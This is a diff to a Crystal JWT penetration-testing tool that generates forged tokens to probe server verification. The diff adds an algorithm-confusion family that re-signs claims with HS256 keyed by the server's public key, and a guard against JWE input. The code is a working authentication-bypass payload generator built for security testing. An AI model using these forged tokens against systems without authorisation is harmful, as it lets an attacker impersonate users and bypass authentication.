@@ -4,9 +4,10 @@ require "json"
 module Gori
   # Testing-payload generator: given a JWT, produce the family of tampered tokens a tester
   # would hand-craft to probe a server's verification logic. Deterministic (no wall clock)
-  # and never raises — an undecodable token just yields an empty list. Three families:
-  # alg:none / signature-strip, weak-secret HS re-sign, and header-parameter injection.
-  # Signing reuses `Jwt.sign` (see forge.cr).
+  # and raises only when the caller supplied a key that will not load — an undecodable token
+  # just yields an empty list. Four families: alg:none / signature-strip, weak-secret HS
+  # re-sign, header-parameter injection, and (only with an operator-supplied public key)
+  # algorithm confusion. Signing reuses `Jwt.sign` (see forge.cr).
   module Jwt
     extend self
 
@@ -33,9 +34,20 @@ module Gori
 
     # Every attack token for `token`, grouped by family in a stable order. Empty when the
     # input isn't a structurally-decodable JWT (need ≥2 segments and a JSON-object header).
-    def attacks(token : String) : Array(Attack)
+    #
+    # `public_key` is the server's VERIFICATION key (a PEM public key, a certificate, or a
+    # path to either) and unlocks the algorithm-confusion family — the one attack here that
+    # cannot be generated from the token alone, because its HMAC secret IS the key's bytes.
+    # A key that will not load raises ForgeError: the operator named it, so a typo is theirs
+    # to see, not something to drop three payloads over in silence.
+    def attacks(token : String, public_key : String? = nil) : Array(Attack)
       list = [] of Attack
-      parts = token.strip.split('.')
+      t = token.strip
+      # A JWE has five segments and a header that decodes cleanly, so every gate below would
+      # pass — and then splice its WRAPPED KEY in as `payload_seg`. There is no claims
+      # segment to tamper with and no signature to strip: refuse the whole generator.
+      return list if Jwe.jwe?(t)
+      parts = t.split('.')
       return list unless parts.size >= 2
       header_seg, payload_seg = parts[0], parts[1]
       header = decode_header(header_seg)
@@ -44,6 +56,7 @@ module Gori
       none_family(list, header, header_seg, payload_seg)
       weak_secret_family(list, header, payload_seg, signature_of(parts), header_seg)
       header_injection_family(list, header, payload_seg)
+      alg_confusion_family(list, header, payload_seg, public_key) if public_key.presence
       list
     end
 
@@ -182,6 +195,46 @@ module Gori
       list << Attack.new("jwk (embedded key)", "header-inject",
         "#{b64url(j.to_json)}.#{payload_seg}.",
         "server may trust the embedded jwk; sign with the matching private key")
+    end
+
+    # --- family 4: algorithm confusion (asymmetric verify → HMAC) ----------------
+    # A server that reads `alg` off the token and dispatches on it will hand an HS256 token to
+    # its HMAC verifier with whatever key it holds for that issuer — and for an RS/PS/ES token
+    # that key is the PUBLIC one, which the attacker also has. So: re-sign the claims HS256
+    # using the public key's own bytes as the HMAC secret.
+    #
+    # This is the one family that needs material from outside the token, which is why it is
+    # opt-in. The bytes matter more than the key: a server holds whatever its config loaded, so
+    # each spelling of the same key is its own payload — the canonical SPKI PEM OpenSSL would
+    # write (which is also how a CERTIFICATE the operator supplied gets reduced to its public
+    # half), and the same text with and without a trailing newline, the difference between
+    # `File.read` and a stripped config value.
+    #
+    # HS256 for every variant, not the digest-matched HS384/HS512: the server picks its MAC
+    # from the token's `alg`, all three are available to it, and HS256 is the shape every
+    # writeup and every server-side denylist is phrased against.
+    private def alg_confusion_family(list, header, payload_seg : String, public_key : String?) : Nil
+      return unless spec = public_key
+      declared = header["alg"]?.try(&.as_s?).try(&.upcase)
+      return unless declared && {"RS", "PS", "ES"}.includes?(declared[0, 2])
+      canonical = Asym.public_spki_pem(spec)
+      given = Asym.pem_for(spec)
+      seen = Set(String).new
+      {
+        {"canonical SPKI PEM", canonical},
+        {"as supplied", given},
+        {"no trailing newline", given.chomp},
+        {"trailing newline", given.chomp + "\n"},
+      }.each do |(label, secret)|
+        next unless seen.add?(secret)
+        h = header.dup
+        h["alg"] = JSON::Any.new("HS256")
+        signing_input = "#{b64url(h.to_json)}.#{payload_seg}"
+        list << Attack.new("HS256 = public key (#{label})", "alg-confusion",
+          "#{signing_input}.#{sign(signing_input, "HS256", secret)}",
+          "#{declared} downgraded to HS256, HMAC-keyed with the public key itself; " \
+          "accepted if the server dispatches on the token's alg and reuses its verification key")
+      end
     end
 
     # A header-injection token that keeps the original alg/signature-empty and just splices
